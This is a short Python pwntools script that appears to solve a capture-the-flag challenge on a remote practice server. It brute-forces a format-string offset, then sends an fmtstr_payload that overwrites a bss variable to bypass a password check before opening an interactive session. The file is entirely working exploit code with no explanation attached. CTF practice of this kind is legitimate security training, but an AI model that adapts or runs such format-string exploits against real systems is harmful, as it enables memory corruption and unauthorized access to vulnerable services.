from pwn import *


# get fmt offset
def exec_fmt(pad):
    # p = process("./pwn")
    p = remote("node4.buuoj.cn", 29997)
    p.send(pad)
    info = p.recv()
    p.close()

    return info

fmt = FmtStr(exec_fmt)
offset = fmt.offset
print("offset ===> ", offset)


# p = process("./pwn")
p = remote("node4.buuoj.cn", 29997)
bss_ad = 0x0804C044

# offset = 10
pad = fmtstr_payload(offset, {bss_ad:1})
p.send(pad)
p.recvuntil("your passwd:")
p.send("1")

p.interactive()

